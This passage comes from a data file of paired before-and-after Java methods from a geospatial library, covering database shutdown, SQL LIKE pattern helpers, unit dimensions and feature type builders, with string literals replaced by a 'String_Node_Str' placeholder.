 * @throws ReflectiveOperationException if an error occurred whilesetting the shutdown property on the Derby data source.
 */
private static synchronized void shutdown() throws ReflectiveOperationException {
  final DataSource ds=source;
  if (ds != null) {
    source=null;
    ds.getClass().getMethod(""String_Node_Str"",String.class).invoke(ds,""String_Node_Str"");
    try {
      ds.getConnection().close();
    }
 catch (    SQLException e) {
      final LogRecord record=new LogRecord(Level.FINE,e.getLocalizedMessage());
      if (!isSuccessfulShutdown(e)) {
        record.setLevel(Level.WARNING);
        record.setThrown(e);
      }
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
  }
}","/** 
 * Invoked when the JVM is shutting down, or when the Servlet or OSGi bundle is uninstalled. This method shutdowns the Derby database.
 * @throws ReflectiveOperationException if an error occurred whilesetting the shutdown property on the Derby data source.
 */
private static synchronized void shutdown() throws ReflectiveOperationException {
  final DataSource ds=source;
  if (ds != null) {
    source=null;
    connected=false;
    ds.getClass().getMethod(""String_Node_Str"",String.class).invoke(ds,""String_Node_Str"");
    try {
      ds.getConnection().close();
    }
 catch (    SQLException e) {
      final LogRecord record=new LogRecord(Level.FINE,e.getLocalizedMessage());
      if (!isSuccessfulShutdown(e)) {
        record.setLevel(Level.WARNING);
        record.setThrown(e);
      }
      record.setLoggerName(Loggers.SQL);
      Logging.log(Initializer.class,""String_Node_Str"",record);
    }
  }
}"
91813,"/** 
 * Returns a string like the given string but with all characters that are not letter or digit replaced by the wildcard % character. <p>This method avoid to put a % symbol as the first character, since it prevent some databases to use their index.</p>
 * @param identifier The identifier to get as a SQL LIKE pattern.
 * @return The given identifier as a SQL LIKE pattern.
 */
public static String toLikePattern(final String identifier){
  boolean isLetterOrDigit=false;
  final StringBuilder buffer=new StringBuilder(identifier.length());
  for (int c, i=0; i < identifier.length(); i+=Character.charCount(c)) {
    c=identifier.codePointAt(i);
    if (Character.isLetterOrDigit(c)) {
      buffer.appendCodePoint(c);
      isLetterOrDigit=true;
    }
 else     if (isLetterOrDigit) {
      isLetterOrDigit=false;
      buffer.append('%');
    }
 else {
      final int p=buffer.length();
      if (p == 0 || buffer.charAt(p - 1) != '%') {
        buffer.appendCodePoint(c != '%' ? c : '_');
      }
    }
  }
  return buffer.toString();
}","/** 
 * Returns a string like the given string but with all characters that are not letter or digit replaced by the wildcard % character. <p>This method avoid to put a % symbol as the first character, since it prevent some databases to use their index.</p>
 * @param identifier the identifier to get as a SQL LIKE pattern.
 * @return the given identifier as a SQL LIKE pattern.
 */
public static String toLikePattern(final String identifier){
  boolean isLetterOrDigit=false;
  final StringBuilder buffer=new StringBuilder(identifier.length());
  for (int c, i=0; i < identifier.length(); i+=Character.charCount(c)) {
    c=identifier.codePointAt(i);
    if (Character.isLetterOrDigit(c)) {
      buffer.appendCodePoint(c);
      isLetterOrDigit=true;
    }
 else     if (isLetterOrDigit) {
      isLetterOrDigit=false;
      buffer.append('%');
    }
 else {
      final int p=buffer.length();
      if (p == 0 || buffer.charAt(p - 1) != '%') {
        buffer.appendCodePoint(c != '%' ? c : '_');
      }
    }
  }
  return buffer.toString();
}"
91814,"/** 
 * Returns a simplified form of the URL (truncated before the first   {@code ?} or {@code ;} character),for logging or informative purpose only.
 * @param metadata The metadata of the database.
 * @return A simplified version of database URL.
 * @throws SQLException if an error occurred while fetching the URL.
 */
public static String getSimplifiedURL(final DatabaseMetaData metadata) throws SQLException {
  String url=metadata.getURL();
  int s1=url.indexOf('?');
  if (s1 < 0)   s1=url.length();
  int s2=url.indexOf(';');
  if (s2 < 0)   s2=url.length();
  return url.substring(0,Math.min(s1,s2));
}","/** 
 * Returns a simplified form of the URL (truncated before the first   {@code ?} or {@code ;} character),for logging or informative purpose only.
 * @param metadata  the metadata of the database.
 * @return a simplified version of database URL.
 * @throws SQLException if an error occurred while fetching the URL.
 */
public static String getSimplifiedURL(final DatabaseMetaData metadata) throws SQLException {
  String url=metadata.getURL();
  int s1=url.indexOf('?');
  if (s1 < 0)   s1=url.length();
  int s2=url.indexOf(';');
  if (s2 < 0)   s2=url.length();
  return url.substring(0,Math.min(s1,s2));
}"
91815,"/** 
 * Workaround for what seems to be a Derby 10.11 bug, which seems to behave as if the LIKE pattern had a trailing % wildcard. This can be verified with the following query on the EPSG database:  {@preformat sqlSELECT COORD_REF_SYS_CODE, COORD_REF_SYS_NAME FROM EPSG.""Coordinate Reference System"" WHERE COORD_REF_SYS_NAME LIKE 'NTF%Paris%Lambert%zone%I'}which returns ""NTF (Paris) / Lambert zone I"" as expected but also zones II and III.
 * @param expected The string to search.
 * @param actual The string found in the database.
 * @return {@code true} if the given string can be accepted.
 */
@Workaround(library=""String_Node_Str"",version=""String_Node_Str"") public static boolean filterFalsePositive(final String expected,final String actual){
  return CharSequences.equalsFiltered(expected,actual,Characters.Filter.LETTERS_AND_DIGITS,false);
}","/** 
 * Workaround for what seems to be a Derby 10.11 bug, which seems to behave as if the LIKE pattern had a trailing % wildcard. This can be verified with the following query on the EPSG database:  {@preformat sqlSELECT COORD_REF_SYS_CODE, COORD_REF_SYS_NAME FROM EPSG.""Coordinate Reference System"" WHERE COORD_REF_SYS_NAME LIKE 'NTF%Paris%Lambert%zone%I'}which returns ""NTF (Paris) / Lambert zone I"" as expected but also zones II and III.
 * @param expected  the string to search.
 * @param actual    the string found in the database.
 * @return {@code true} if the given string can be accepted.
 */
@Workaround(library=""String_Node_Str"",version=""String_Node_Str"") public static boolean filterFalsePositive(final String expected,final String actual){
  return CharSequences.equalsFiltered(expected,actual,Characters.Filter.LETTERS_AND_DIGITS,false);
}"
91816,"/** 
 * Invoked on deserialization for returning a unique instance of   {@code UnitDimension}.
 */
Object readResolve() throws ObjectStreamException {
  final UnitDimension dim=POOL.putIfAbsent(components,this);
  return (dim != null) ? dim : this;
}","/** 
 * Invoked on deserialization for returning a unique instance of   {@code UnitDimension}.
 */
Object readResolve() throws ObjectStreamException {
  if (isDimensionless())   return NONE;
  final UnitDimension dim=POOL.putIfAbsent(components,this);
  return (dim != null) ? dim : this;
}"
91817,"/** 
 * Compares this dimension with the given object for equality.
 */
@Override public boolean equals(final Object other){
  if (other == this) {
    return true;
  }
  if (other instanceof UnitDimension) {
    final UnitDimension that=(UnitDimension)other;
    if (symbol == that.symbol) {
      return (symbol == 0) || components.equals(that.components);
    }
  }
  return false;
}","/** 
 * Compares this dimension with the given object for equality.
 */
@Override public boolean equals(final Object other){
  if (other == this) {
    return true;
  }
  if (other instanceof UnitDimension) {
    final UnitDimension that=(UnitDimension)other;
    if (symbol == that.symbol) {
      return (symbol != 0) || components.equals(that.components);
    }
  }
  return false;
}"
91818,"/** 
 * Creates a new derived dimension from the given product of base dimensions with their power. This method returns a shared instance if possible.
 * @param components  the product of base dimensions together with their power.
 */
private static UnitDimension create(Map<UnitDimension,Fraction> components){
switch (components.size()) {
case 0:
    return NONE;
case 1:
{
    final Map.Entry<UnitDimension,Fraction> entry=components.entrySet().iterator().next();
    final UnitDimension base=entry.getKey();
    final Fraction power=entry.getValue();
    if (power.numerator == 1 && power.denominator == 1) {
      return base;
    }
    break;
  }
}
UnitDimension dim=POOL.get(components);
if (dim == null) {
components.replaceAll((c,power) -> power.unique());
components=CollectionsExt.unmodifiableOrCopy(components);
dim=new UnitDimension(components);
final UnitDimension c=POOL.putIfAbsent(components,dim);
if (c != null) {
  return c;
}
}
return dim;
}","/** 
 * Creates a new derived dimension from the given product of base dimensions with their power. This method returns a shared instance if possible.
 * @param components  the product of base dimensions together with their power.
 */
private static UnitDimension create(Map<UnitDimension,Fraction> components){
switch (components.size()) {
case 0:
    return NONE;
case 1:
{
    final Map.Entry<UnitDimension,Fraction> entry=components.entrySet().iterator().next();
    final Fraction power=entry.getValue();
    if (power.numerator == 1 && power.denominator == 1) {
      return entry.getKey();
    }
    break;
  }
}
UnitDimension dim=POOL.get(components);
if (dim == null) {
components.replaceAll((c,power) -> power.unique());
components=CollectionsExt.unmodifiableOrCopy(components);
dim=new UnitDimension(components);
final UnitDimension c=POOL.putIfAbsent(components,dim);
if (c != null) {
  return c;
}
}
return dim;
}"
91819,"/** 
 * Creates a new derived dimension. This constructor shall never be invoked directly; use   {@link #create(Map)} instead.
 * @param components  the product of base dimensions together with their power.
 */
private UnitDimension(final Map<UnitDimension,Fraction> components){
  this.components=components;
  this.symbol=0;
}","/** 
 * Creates a new derived dimension. This constructor shall never be invoked directly (except for   {@link #NONE}); use   {@link #create(Map)} instead.
 * @param components  the product of base dimensions together with their power.
 */
private UnitDimension(final Map<UnitDimension,Fraction> components){
  this.components=components;
  this.symbol=0;
}"
91820,"/** 
 * Formats a single unit or dimension raised to the given power.
 * @param entry    the base unit or base dimension to format, together with its power.
 * @param inverse  {@code true} for inverting the power sign.
 */
private static void formatComponent(final Map.Entry<?,? extends Number> entry,final boolean inverse,final Appendable toAppendTo) throws IOException {
  formatSymbol(entry.getKey(),toAppendTo);
  final Number power=entry.getValue();
  int n;
  if (power instanceof Fraction) {
    Fraction f=(Fraction)power;
    if (f.denominator != 1) {
      if (inverse) {
        f=f.negate();
      }
      final String t=f.toString();
      if (t.length() == 1) {
        toAppendTo.append('^').append(t);
      }
 else {
        toAppendTo.append(""String_Node_Str"").append(t).append(')');
      }
    }
    n=f.numerator;
  }
 else {
    n=power.intValue();
  }
  if (inverse)   n=-n;
  if (n != 1) {
    final String t=String.valueOf(n);
    for (int i=0; i < t.length(); i++) {
      toAppendTo.append(Characters.toSuperScript(t.charAt(i)));
    }
  }
}","/** 
 * Formats a single unit or dimension raised to the given power.
 * @param entry    the base unit or base dimension to format, together with its power.
 * @param inverse  {@code true} for inverting the power sign.
 */
private static void formatComponent(final Map.Entry<?,? extends Number> entry,final boolean inverse,final Appendable toAppendTo) throws IOException {
  formatSymbol(entry.getKey(),toAppendTo);
  final Number power=entry.getValue();
  int n;
  if (power instanceof Fraction) {
    Fraction f=(Fraction)power;
    if (f.denominator != 1) {
      if (inverse) {
        f=f.negate();
      }
      final String t=f.toString();
      if (t.length() == 1) {
        toAppendTo.append('^').append(t);
      }
 else {
        toAppendTo.append(""String_Node_Str"").append(t).append(')');
      }
      return;
    }
    n=f.numerator;
  }
 else {
    n=power.intValue();
  }
  if (inverse)   n=-n;
  if (n != 1) {
    final String t=String.valueOf(n);
    for (int i=0; i < t.length(); i++) {
      toAppendTo.append(Characters.toSuperScript(t.charAt(i)));
    }
  }
}"
91821,"/** 
 * Returns   {@code true} if the given texts are equal, optionally ignoring case and filtered-out characters.This method is sometime used for comparing identifiers in a lenient way. <p><b>Example:</b> the following call compares the two strings ignoring case and any characters which are not  {@linkplain Character#isLetterOrDigit(int) letter or digit}. In particular, spaces and punctuation characters like   {@code '_'} and {@code '-'} areignored:</p> {@preformat javaassert equalsFiltered(""WGS84"", ""WGS_84"", Characters.Filter.LETTERS_AND_DIGITS, true) == true;}
 * @param s1          the first characters sequence to compare, or {@code null}.
 * @param s2          the second characters sequence to compare, or {@code null}.
 * @param filter      the subset of characters to compare, or {@code null} for comparing all characters.
 * @param ignoreCase  {@code true} for comparing cases, or {@code false} for requiring exact match.
 * @return {@code true} if both arguments are {@code null} or if the two given texts are equal,optionally ignoring case and filtered-out characters.
 */
public static boolean equalsFiltered(final CharSequence s1,final CharSequence s2,final Characters.Filter filter,final boolean ignoreCase){
  if (s1 == s2) {
    return true;
  }
  if (s1 == null || s2 == null) {
    return false;
  }
  if (filter == null) {
    return ignoreCase ? equalsIgnoreCase(s1,s2) : equals(s1,s2);
  }
  final int lg1=s1.length();
  final int lg2=s2.length();
  int i1=0, i2=0;
  while (i1 < lg1) {
    int c1=codePointAt(s1,i1);
    final int n=charCount(c1);
    if (filter.contains(c1)) {
      int c2;
      do {
        if (i2 >= lg2) {
          return false;
        }
        c2=codePointAt(s2,i2);
        i2+=charCount(c2);
      }
 while (!filter.contains(c2));
      if (c1 != c2 && !(ignoreCase && equalsIgnoreCase(c1,c2))) {
        return false;
      }
    }
    i1+=n;
  }
  while (i2 < lg2) {
    final int s=codePointAt(s2,i2);
    if (filter.contains(s)) {
      return false;
    }
    i2+=charCount(s);
  }
  return true;
}","/** 
 * Returns   {@code true} if the given texts are equal, optionally ignoring case and filtered-out characters.This method is sometime used for comparing identifiers in a lenient way. <p><b>Example:</b> the following call compares the two strings ignoring case and any characters which are not  {@linkplain Character#isLetterOrDigit(int) letter or digit}. In particular, spaces and punctuation characters like   {@code '_'} and {@code '-'} areignored:</p> {@preformat javaassert equalsFiltered(""WGS84"", ""WGS_84"", Characters.Filter.LETTERS_AND_DIGITS, true) == true;}
 * @param s1          the first characters sequence to compare, or {@code null}.
 * @param s2          the second characters sequence to compare, or {@code null}.
 * @param filter      the subset of characters to compare, or {@code null} for comparing all characters.
 * @param ignoreCase  {@code true} for ignoring cases, or {@code false} for requiring exact match.
 * @return {@code true} if both arguments are {@code null} or if the two given texts are equal,optionally ignoring case and filtered-out characters.
 */
public static boolean equalsFiltered(final CharSequence s1,final CharSequence s2,final Characters.Filter filter,final boolean ignoreCase){
  if (s1 == s2) {
    return true;
  }
  if (s1 == null || s2 == null) {
    return false;
  }
  if (filter == null) {
    return ignoreCase ? equalsIgnoreCase(s1,s2) : equals(s1,s2);
  }
  final int lg1=s1.length();
  final int lg2=s2.length();
  int i1=0, i2=0;
  while (i1 < lg1) {
    int c1=codePointAt(s1,i1);
    final int n=charCount(c1);
    if (filter.contains(c1)) {
      int c2;
      do {
        if (i2 >= lg2) {
          return false;
        }
        c2=codePointAt(s2,i2);
        i2+=charCount(c2);
      }
 while (!filter.contains(c2));
      if (c1 != c2 && !(ignoreCase && equalsIgnoreCase(c1,c2))) {
        return false;
      }
    }
    i1+=n;
  }
  while (i2 < lg2) {
    final int s=codePointAt(s2,i2);
    if (filter.contains(s)) {
      return false;
    }
    i2+=charCount(s);
  }
  return true;
}"
91822,"/** 
 * Creates a new   {@code FeatureAssociationRole} builder initialized to the values of an existing association.
 * @param owner  the builder of the {@code FeatureType} for which to add this property.
 */
AssociationRoleBuilder(final FeatureTypeBuilder owner,final FeatureAssociationRole template){
  super(owner,template);
  minimumOccurs=template.getMinimumOccurs();
  maximumOccurs=template.getMaximumOccurs();
  type=template.getValueType();
  typeName=type.getName();
}","/** 
 * Creates a new   {@code FeatureAssociationRole} builder initialized to the values of an existing association.
 * @param owner  the builder of the {@code FeatureType} for which to add this property.
 */
AssociationRoleBuilder(final FeatureTypeBuilder owner,final FeatureAssociationRole template){
  super(owner,template);
  property=template;
  minimumOccurs=template.getMinimumOccurs();
  maximumOccurs=template.getMaximumOccurs();
  type=template.getValueType();
  typeName=type.getName();
}"
91823,"/** 
 * Creates a new   {@code AttributeType} builder initialized to the values of an existing attribute.
 * @param owner  the builder of the {@code FeatureType} for which to add the attribute.
 */
AttributeTypeBuilder(final FeatureTypeBuilder owner,final AttributeType<V> template){
  super(owner,template);
  minimumOccurs=template.getMinimumOccurs();
  maximumOccurs=template.getMaximumOccurs();
  valueClass=template.getValueClass();
  defaultValue=template.getDefaultValue();
  final Map<String,AttributeType<?>> tc=template.characteristics();
  characteristics=new ArrayList<>(tc.size());
  for (  final AttributeType<?> c : tc.values()) {
    characteristics.add(new CharacteristicTypeBuilder<>(this,c));
  }
}","/** 
 * Creates a new   {@code AttributeType} builder initialized to the values of an existing attribute.
 * @param owner  the builder of the {@code FeatureType} for which to add the attribute.
 */
AttributeTypeBuilder(final FeatureTypeBuilder owner,final AttributeType<V> template){
  super(owner,template);
  property=template;
  minimumOccurs=template.getMinimumOccurs();
  maximumOccurs=template.getMaximumOccurs();
  valueClass=template.getValueClass();
  defaultValue=template.getDefaultValue();
  final Map<String,AttributeType<?>> tc=template.characteristics();
  characteristics=new ArrayList<>(tc.size());
  for (  final AttributeType<?> c : tc.values()) {
    characteristics.add(new CharacteristicTypeBuilder<>(this,c));
  }
}"
91824,"/** 
 * Sets the class of attribute values. Callers <strong>must</strong> use the builder returned by this method instead of   {@code this} builder after this method call, since the returned builder may be a new instance.
 * @param < N >   the compile-time value of the {@code type} argument.
 * @param type  the new class of attribute values.
 * @return the attribute builder  <em>not necessarily this instance.</em>
 * @throws UnconvertibleObjectException if the {@linkplain #getDefaultValue() default value}can not be converted to the given   {@code <N>} class.
 * @see #getValueClass()
 */
@SuppressWarnings(""String_Node_Str"") public <N>AttributeTypeBuilder<N> setValueClass(final Class<N> type) throws UnconvertibleObjectException {
  final FeatureTypeBuilder owner=owner();
  ensureNonNull(""String_Node_Str"",type);
  if (type == valueClass) {
    return (AttributeTypeBuilder<N>)this;
  }
  final AttributeTypeBuilder<N> newb=new AttributeTypeBuilder<>(this,type);
  for (  final CharacteristicTypeBuilder<?> c : characteristics) {
    c.owner(newb);
  }
  owner.properties.set(owner.properties.lastIndexOf(this),newb);
  dispose();
  return newb;
}","/** 
 * Sets the class of attribute values. Callers <strong>must</strong> use the builder returned by this method instead of   {@code this} builder after this method call, since the returned builder may be a new instance.
 * @param < N >   the compile-time value of the {@code type} argument.
 * @param type  the new class of attribute values.
 * @return the attribute builder  <em>not necessarily this instance.</em>
 * @throws UnconvertibleObjectException if the {@linkplain #getDefaultValue() default value}can not be converted to the given   {@code <N>} class.
 * @see #getValueClass()
 */
@SuppressWarnings(""String_Node_Str"") public <N>AttributeTypeBuilder<N> setValueClass(final Class<N> type) throws UnconvertibleObjectException {
  final FeatureTypeBuilder owner=owner();
  ensureNonNull(""String_Node_Str"",type);
  if (type == valueClass) {
    return (AttributeTypeBuilder<N>)this;
  }
  final AttributeTypeBuilder<N> newb=new AttributeTypeBuilder<>(this,type);
  for (  final CharacteristicTypeBuilder<?> c : characteristics) {
    c.owner(newb);
  }
  owner.replace(this,newb);
  dispose();
  return newb;
}"
91825,"/** 
 * Creates a new characteristic builder initialized to the values of an existing attribute.
 * @param owner  the builder of the {@code AttributeType} for which to add this property.
 */
CharacteristicTypeBuilder(final AttributeTypeBuilder<?> owner,final AttributeType<V> template){
  super(template,owner.getLocale());
  this.owner=owner;
  valueClass=template.getValueClass();
  defaultValue=template.getDefaultValue();
  characteristic=template;
}","/** 
 * Creates a new characteristic builder initialized to the values of an existing attribute.
 * @param owner  the builder of the {@code AttributeType} for which to add this property.
 */
CharacteristicTypeBuilder(final AttributeTypeBuilder<?> owner,final AttributeType<V> template){
  super(template,owner.getLocale());
  this.owner=owner;
  characteristic=template;
  valueClass=template.getValueClass();
  defaultValue=template.getDefaultValue();
}"
91826,"/** 
 * Creates a new characteristic from the current setting.
 */
final AttributeType<V> build(){
  if (characteristic == null) {
    characteristic=new DefaultAttributeType<>(identification(),valueClass,0,1,defaultValue);
  }
  return characteristic;
}","/** 
 * Builds the characteristic type from the information specified to this builder. If a type has already been built and this builder state has not changed since the type creation, then the previously created   {@code AttributeType} instance is returned.
 * @return the characteristic type.
 */
@Override public AttributeType<V> build(){
  if (characteristic == null) {
    characteristic=new DefaultAttributeType<>(identification(),valueClass,0,1,defaultValue);
  }
  return characteristic;
}"
91827,"/** 
 * Builds the feature type from the information and properties specified to this builder. One of the   {@code setName()} methods must have been invoked before this {@code build()} method (mandatory).All other methods are optional, but some calls to a  {@code add} method are usually needed.
 * @return the new feature type.
 * @throws IllegalStateException if the feature type contains incompatible{@linkplain AttributeTypeBuilder#setCRS CRS characteristics}.
 */
public FeatureType build() throws IllegalStateException {
  if (feature == null) {
    final int numSpecified=properties.size();
    int numSynthetic;
    int envelopeIndex=-1;
    int geometryIndex=-1;
    final PropertyType[] identifierTypes;
    if (identifierCount == 0) {
      numSynthetic=0;
      identifierTypes=null;
    }
 else {
      numSynthetic=1;
      identifierTypes=new PropertyType[identifierCount];
    }
    if (defaultGeometry != null) {
      envelopeIndex=numSynthetic++;
      if (!AttributeConvention.GEOMETRY_PROPERTY.equals(defaultGeometry.getName())) {
        geometryIndex=numSynthetic++;
      }
    }
    final PropertyType[] propertyTypes=new PropertyType[numSynthetic + numSpecified];
    int propertyCursor=numSynthetic;
    int identifierCursor=0;
    for (int i=0; i < numSpecified; i++) {
      final PropertyTypeBuilder builder=properties.get(i);
      final PropertyType instance=builder.build();
      propertyTypes[propertyCursor]=instance;
      if (builder.isIdentifier()) {
        identifierTypes[identifierCursor++]=instance;
      }
      if (builder == defaultGeometry && geometryIndex >= 0) {
        if (propertyTypes[geometryIndex] != null) {
          throw new CorruptedObjectException();
        }
        propertyTypes[geometryIndex]=FeatureOperations.link(name(AttributeConvention.GEOMETRY_PROPERTY),instance);
      }
      propertyCursor++;
    }
    if (envelopeIndex >= 0)     try {
      propertyTypes[envelopeIndex]=FeatureOperations.envelope(name(AttributeConvention.ENVELOPE_PROPERTY),null,propertyTypes);
    }
 catch (    FactoryException e) {
      throw new IllegalStateException(e);
    }
    if (identifierTypes != null) {
      if (identifierCursor != identifierTypes.length) {
        throw new CorruptedObjectException();
      }
      if (AttributeConvention.IDENTIFIER_PROPERTY.equals(identifierTypes[0].getName())) {
        if (identifierCursor > 1) {
          throw new IllegalStateException(Errors.format(Errors.Keys.PropertyAlreadyExists_2,getDisplayName(),AttributeConvention.IDENTIFIER_PROPERTY));
        }
        System.arraycopy(propertyTypes,1,propertyTypes,0,--propertyCursor);
      }
 else {
        propertyTypes[0]=FeatureOperations.compound(name(AttributeConvention.IDENTIFIER_PROPERTY),idDelimiter,idPrefix,idSuffix,identifierTypes);
      }
    }
    feature=new DefaultFeatureType(identification(),isAbstract(),superTypes.toArray(new FeatureType[superTypes.size()]),ArraysExt.resize(propertyTypes,propertyCursor));
  }
  return feature;
}","/** 
 * Builds the feature type from the information and properties specified to this builder. One of the   {@code setName()} methods must have been invoked before this {@code build()} method (mandatory).All other methods are optional, but some calls to a  {@code add} method are usually needed.<p>If a feature type has already been built and this builder state has not changed since the feature type creation, then the previously created  {@code FeatureType} instance is returned.</p>
 * @return the feature type.
 * @throws IllegalStateException if the builder contains inconsistent information.
 */
@Override public FeatureType build() throws IllegalStateException {
  if (feature == null) {
    final int numSpecified=properties.size();
    int numSynthetic;
    int envelopeIndex=-1;
    int geometryIndex=-1;
    final PropertyType[] identifierTypes;
    if (identifierCount == 0) {
      numSynthetic=0;
      identifierTypes=null;
    }
 else {
      numSynthetic=1;
      identifierTypes=new PropertyType[identifierCount];
    }
    if (defaultGeometry != null) {
      envelopeIndex=numSynthetic++;
      if (!AttributeConvention.GEOMETRY_PROPERTY.equals(defaultGeometry.getName())) {
        geometryIndex=numSynthetic++;
      }
    }
    final PropertyType[] propertyTypes=new PropertyType[numSynthetic + numSpecified];
    int propertyCursor=numSynthetic;
    int identifierCursor=0;
    for (int i=0; i < numSpecified; i++) {
      final PropertyTypeBuilder builder=properties.get(i);
      final PropertyType instance=builder.build();
      propertyTypes[propertyCursor]=instance;
      if (builder.isIdentifier()) {
        identifierTypes[identifierCursor++]=instance;
      }
      if (builder == defaultGeometry && geometryIndex >= 0) {
        if (propertyTypes[geometryIndex] != null) {
          throw new CorruptedObjectException();
        }
        propertyTypes[geometryIndex]=FeatureOperations.link(name(AttributeConvention.GEOMETRY_PROPERTY),instance);
      }
      propertyCursor++;
    }
    if (envelopeIndex >= 0)     try {
      propertyTypes[envelopeIndex]=FeatureOperations.envelope(name(AttributeConvention.ENVELOPE_PROPERTY),null,propertyTypes);
    }
 catch (    FactoryException e) {
      throw new IllegalStateException(e);
    }
    if (identifierTypes != null) {
      if (identifierCursor != identifierTypes.length) {
        throw new CorruptedObjectException();
      }
      if (AttributeConvention.IDENTIFIER_PROPERTY.equals(identifierTypes[0].getName())) {
        if (identifierCursor > 1) {
          throw new IllegalStateException(Errors.format(Errors.Keys.PropertyAlreadyExists_2,getDisplayName(),AttributeConvention.IDENTIFIER_PROPERTY));
        }
        System.arraycopy(propertyTypes,1,propertyTypes,0,--propertyCursor);
      }
 else {
        propertyTypes[0]=FeatureOperations.compound(name(AttributeConvention.IDENTIFIER_PROPERTY),idDelimiter,idPrefix,idSuffix,identifierTypes);
      }
    }
    feature=new DefaultFeatureType(identification(),isAbstract(),superTypes.toArray(new FeatureType[superTypes.size()]),ArraysExt.resize(propertyTypes,propertyCursor));
  }
  return feature;
}"
91828,"/** 
 * Helper method for creating identification info of synthetic attributes.
 */
static Map<String,?> name(final GenericName name){
  return Collections.singletonMap(AbstractOperation.NAME_KEY,name);
}","/** 
 * Helper method for creating identification info of synthetic attributes.
 */
private static Map<String,?> name(final GenericName name){
  return Collections.singletonMap(AbstractOperation.NAME_KEY,name);
}"
91829,"/** 
 * Creates a new   {@code PropertyType} builder initialized to the values of an existing property.
 * @param owner     the builder of the {@code FeatureType} for which to add this property.
 * @param template  an existing property to use as a template, or {@code null} if none.
 */
PropertyTypeBuilder(final FeatureTypeBuilder owner,final PropertyType template){
  super(template,owner.getLocale());
  this.owner=owner;
  minimumOccurs=owner.defaultMinimumOccurs;
  maximumOccurs=owner.defaultMaximumOccurs;
  property=template;
}","/** 
 * Creates a new   {@code PropertyType} builder initialized to the values of an existing property.
 * @param owner     the builder of the {@code FeatureType} for which to add this property.
 * @param template  an existing property to use as a template, or {@code null} if none.
 */
PropertyTypeBuilder(final FeatureTypeBuilder owner,final PropertyType template){
  super(template,owner.getLocale());
  this.owner=owner;
  minimumOccurs=owner.defaultMinimumOccurs;
  maximumOccurs=owner.defaultMaximumOccurs;
}"
91830,"/** 
 * Returns the property type from the current setting. This method may return an existing property if it was already created.
 */
final PropertyType build(){
  if (property == null) {
    property=create();
  }
  return property;
}","/** 
 * Builds the property type from the information specified to this builder. If a type has already been built and this builder state has not changed since the type creation, then the previously created   {@code PropertyType} instance is returned(see  {@link AttributeTypeBuilder#build()} for more information).
 * @return the property type.
 * @throws IllegalStateException if the builder contains inconsistent information.
 */
@Override public abstract PropertyType build() throws IllegalStateException ;"
91831,"/** 
 * If the   {@code PropertyType} created by the last call to {@link #build()} has been cached,clears that cache. This method must be invoked every time that a setter method is invoked.
 */
@Override final void clearCache(){
  property=null;
  ensureAlive(owner);
  owner.clearCache();
}","/** 
 * If the   {@code PropertyType} created by the last call to {@link #build()} has been cached,clears that cache. This method must be invoked every time that a setter method is invoked.
 */
@Override void clearCache(){
  ensureAlive(owner);
  owner.clearCache();
}"
91832,"/** 
 * Removes this property from the   {@code FeatureTypeBuilder}. After this method has been invoked, this   {@code PropertyTypeBuilder} instanceis no longer in the list returned by  {@link FeatureTypeBuilder#properties()}and attempts to invoke any setter method on   {@code this} will cause an{@link IllegalStateException} to be thrown.
 */
public void remove(){
  if (owner != null) {
    owner.properties.remove(owner.properties.lastIndexOf(this));
    dispose();
  }
}","/** 
 * Removes this property from the   {@code FeatureTypeBuilder}. After this method has been invoked, this   {@code PropertyTypeBuilder} instanceis no longer in the list returned by  {@link FeatureTypeBuilder#properties()}and attempts to invoke any setter method on   {@code this} will cause an{@link IllegalStateException} to be thrown.
 */
public void remove(){
  if (owner != null) {
    owner.replace(this,null);
    dispose();
  }
}"
91833,"/** 
 * Computes a hash code value for this transform.
 */
@Override protected int computeHashCode(){
  return super.hashCode() ^ Arrays.hashCode(values);
}","/** 
 * Computes a hash code value for this transform.
 */
@Override protected int computeHashCode(){
  return super.computeHashCode() ^ Arrays.hashCode(values);
}"
91834,"/** 
 * Adds the specified range to the specified sequence.
 * @param sequence  The {@link #sourceDimensions} or {@link #targetDimensions} sequence to update.
 * @param lower     The lower value of the range to add, inclusive.
 * @param upper     The upper value of the range to add, exclusive.
 * @param max       The maximal value allowed, exclusive.
 * @throws IllegalArgumentException if the {@code lower} or {@code upper} value does not meet the conditions.
 */
private static int[] add(int[] sequence,final int lower,final int upper,final int max) throws IllegalArgumentException {
}","/** 
 * Adds the specified range to the specified sequence.
 * @param sequence  the {@link #sourceDimensions} or {@link #targetDimensions} sequence to update.
 * @param lower     the lower value of the range to add, inclusive.
 * @param upper     the upper value of the range to add, exclusive.
 * @param max       the maximal value allowed, exclusive.
 * @throws IllegalArgumentException if the {@code lower} or {@code upper} value does not meet the conditions.
 */
private static int[] add(int[] sequence,final int lower,final int upper,final int max) throws IllegalArgumentException {
}"
91835,"/** 
 * Adds a range of input dimensions to keep in the separated transform. The   {@code lower} and {@code upper} values define a range of  <em>source</em> dimension indicesof the transform given to the constructor.
 * @param lower The lower dimension, inclusive. Shall not be smaller than 0.
 * @param upper The upper dimension, exclusive. Shall be smaller than {@link MathTransform#getSourceDimensions()}.
 * @throws IllegalArgumentException if {@code lower} or {@code upper} are out of bounds.
 */
public void addSourceDimensionRange(final int lower,final int upper) throws IllegalArgumentException {
  sourceDimensions=add(sourceDimensions,lower,upper,transform.getSourceDimensions());
}","/** 
 * Adds a range of input dimensions to keep in the separated transform. The   {@code lower} and {@code upper} values define a range of  <em>source</em> dimension indicesof the transform given to the constructor.
 * @param lower  the lower dimension, inclusive. Shall not be smaller than 0.
 * @param upper  the upper dimension, exclusive. Shall be smaller than {@link MathTransform#getSourceDimensions()}.
 * @throws IllegalArgumentException if {@code lower} or {@code upper} are out of bounds.
 */
public void addSourceDimensionRange(final int lower,final int upper) throws IllegalArgumentException {
  sourceDimensions=add(sourceDimensions,lower,upper,transform.getSourceDimensions());
}"
91836,"/** 
 * Adds output dimensions to keep in the separated transform. The given values are <em>target</em> dimension indices of the transform given to the constructor. <p>Constraints:</p> <ul> <li>All numbers shall be in the range 0 inclusive to   {@link MathTransform#getTargetDimensions()} exclusive.</li><li>The  {@code dimensions} values shall be in strictly increasing order.</li><li>The  {@code dimensions} values shall be greater than all values specified by all previous callsof this method since construction or since the last call to  {@link #clear()}.</li> </ul>
 * @param dimensions A sequence of target dimensions to keep, in strictly increasing order.
 * @throws IllegalArgumentException if {@code dimensions} contains negative valuesor if values are not in a strictly increasing order.
 */
public void addTargetDimensions(final int... dimensions) throws IllegalArgumentException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",dimensions);
